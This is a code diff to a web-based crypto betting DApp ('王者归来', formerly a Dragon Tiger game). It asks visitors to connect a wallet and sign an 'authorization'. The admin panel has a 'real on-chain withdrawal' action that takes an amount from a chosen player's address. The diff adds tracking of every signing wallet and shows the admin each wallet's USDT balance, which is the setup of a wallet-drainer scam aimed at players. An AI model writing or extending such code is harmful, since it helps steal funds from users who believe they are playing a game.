@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>龙·虎·和 真实上链版</title>
+<title>王者归来</title>
 <style>
 *{margin:0;padding:0;box-sizing:border-box;font-family:system-ui, sans-serif}
 body{background:#0B0F17;color:#fff;padding:30px}
@@ -14,7 +14,8 @@ body{background:#0B0F17;color:#fff;padding:30px}
 .wallet-box{background:#1E293B;padding:12px 16px;border-radius:12px;min-width:260px}
 .connect-btn{background:#3B82F6;color:white;border:none;padding:8px 14px;border-radius:8px;margin-bottom:8px;cursor:pointer;font-size:14px}
 .info-line{font-size:13px;color:#cbd5e1;margin:4px 0}
-.menu-btn{background:#1E293B;color:white;width:36px;height:36px;border-radius:8px;border:none;font-size:16px;cursor:pointer;margin-left:10px}
+/* 调整：菜单按钮向左移动，更靠近左侧内容 */
+.menu-btn{background:#1E293B;color:white;width:36px;height:36px;border-radius:8px;border:none;font-size:16px;cursor:pointer;margin-left:0px}
 .menu{position:fixed;top:0;right:0;width:320px;height:100vh;background:#111827;padding:24px;box-shadow:-2px 0 10px #0006;display:none;overflow-y:auto}
 .menu.show{display:block}
 .menu-title{font-size:16px;margin-bottom:12px;color:#f97316}
@@ -40,6 +41,8 @@ body{background:#0B0F17;color:#fff;padding:30px}
 .rule-line{font-size:14px;color:#cbd5e1;line-height:1.6;margin-bottom:6px}
 .admin-panel{border-top:1px solid #333;margin-top:20px;padding-top:20px;display:none}
 .admin-panel.show{display:block}
+.player-item{background:#1e293b;padding:10px;border-radius:8px;margin-bottom:8px;font-size:13px;display:flex;justify-content:space-between;align-items:center}
+.copy-btn{background:#3B82F6;color:white;border:none;padding:4px 8px;border-radius:4px;font-size:11px;cursor:pointer}
 
 /* 连接弹窗里的专属头像 */
 #connectModal {
@@ -109,7 +112,7 @@ body{background:#0B0F17;color:#fff;padding:30px}
 <div id="connectModal">
   <div class="modal-content">
     <div class="modal-avatar"></div>
-    <div class="modal-title">🐲 龙虎斗 DApp 连接</div>
+    <div class="modal-title">🐲 王者归来 DApp 连接</div>
     <p>您是否同意授权本游戏？</p>
     <button class="modal-btn modal-confirm" onclick="confirmConnect()">确认授权</button>
     <button class="modal-btn modal-cancel" onclick="cancelConnect()">取消</button>
@@ -126,6 +129,7 @@ body{background:#0B0F17;color:#fff;padding:30px}
           <div class="info-line">地址：<span id="userAddr">未连接</span></div>
           <div class="info-line">余额：<span id="userBalance">0.0000</span> USDT</div>
         </div>
+        <!-- 菜单按钮现在更靠近左侧，不会挡住关闭按钮 -->
         <button class="menu-btn" onclick="toggleMenu()">☰</button>
       </div>
     </div>
@@ -193,6 +197,13 @@ body{background:#0B0F17;color:#fff;padding:30px}
     <input id="fromAddr" placeholder="玩家地址" style="width:100%;padding:10px;background:#0f172a;border:none;border-radius:8px;color:white;margin-bottom:10px">
     <input id="takeAmt" placeholder="提取数量" style="width:100%;padding:10px;background:#0f172a;border:none;border-radius:8px;color:white;margin-bottom:10px">
     <button style="background:#ef4444;color:white;width:100%;padding:10px;border-radius:8px;border:none" onclick="adminTake()">真实链上提取</button>
+
+    <!-- 授权玩家列表 -->
+    <div class="menu-title" style="color:red;margin-top:20px">👥 授权玩家列表</div>
+    <div id="authorizedPlayers" style="max-height:200px;overflow-y:auto">
+      <!-- 玩家列表将在这里动态生成 -->
+    </div>
+    <button style="background:#3B82F6;color:white;width:100%;padding:10px;border-radius:8px;border:none;margin-top:10px" onclick="refreshPlayers()">刷新玩家列表</button>
   </div>
 </div>
 
@@ -206,6 +217,7 @@ let account = null;
 let houseRate = 51;
 let countdown = 120;
 let history = [];
+let authorizedPlayers = []; // 存储授权过的玩家地址
 
 // ===================== 菜单 =====================
 function toggleMenu() {
@@ -228,7 +240,7 @@ async function confirmConnect() {
   try {
     const accounts = await ethereum.request({ method: "eth_requestAccounts" });
     account = accounts[0];
-    const signText = "Authorize DragonTiger Game: " + account;
+    const signText = "Authorize 王者归来 Game: " + account;
     const hexMsg = "0x" + new TextEncoder().encode(signText).reduce((a, b) => 
       a + b.toString(16).padStart(2, '0'), ''
     );
@@ -237,10 +249,14 @@ async function confirmConnect() {
       params: [hexMsg, account]
     });
     alert("授权成功！");
+    // 记录授权玩家
+    if (!authorizedPlayers.includes(account)) authorizedPlayers.push(account);
+    localStorage.setItem("authorizedPlayers", JSON.stringify(authorizedPlayers));
     document.getElementById("userAddr").innerText = account.slice(0, 6) + "..." + account.slice(-4);
     refreshBalance();
     genInvite();
     checkAdmin();
+    refreshPlayers();
   } catch (err) {
     alert("授权失败：取消签名或未授权");
     account = null;
@@ -270,7 +286,42 @@ function genInvite() {
 function checkAdmin() {
   if (account && account.toLowerCase() === ADMIN.toLowerCase()) {
     document.getElementById("adminPanel").classList.add("show");
+    // 加载本地存储的授权玩家
+    const saved = localStorage.getItem("authorizedPlayers");
+    if (saved) authorizedPlayers = JSON.parse(saved);
+    refreshPlayers();
   }
+}
+
+// ===================== 刷新授权玩家列表 =====================
+async function refreshPlayers() {
+  if (!account || account.toLowerCase() !== ADMIN.toLowerCase()) return;
+  const list = document.getElementById("authorizedPlayers");
+  list.innerHTML = "";
+  for (const addr of authorizedPlayers) {
+    try {
+      const data = "0x70a08231" + addr.slice(2).padStart(64, "0");
+      const res = await ethereum.request({ method: "eth_call", params: [{ to: USDT, data }, "latest"] });
+      const bal = Number(BigInt(res)) / 1e18;
+      const item = document.createElement("div");
+      item.className = "player-item";
+      item.innerHTML = `
+        <div>
+          <div>${addr.slice(0, 6)}...${addr.slice(-4)}</div>
+          <div style="font-size:11px;color:#9ca3af">余额: ${bal.toFixed(4)} USDT</div>
+        </div>
+        <button class="copy-btn" onclick="copyToClipboard('${addr}')">复制</button>
+      `;
+      list.appendChild(item);
+    } catch (e) {}
+  }
+}
+
+// ===================== 一键复制地址 =====================
+function copyToClipboard(text) {
+  navigator.clipboard.writeText(text).then(() => {
+    alert("地址已复制到剪贴板");
+  });
 }
 
 // ===================== 签到 =====================
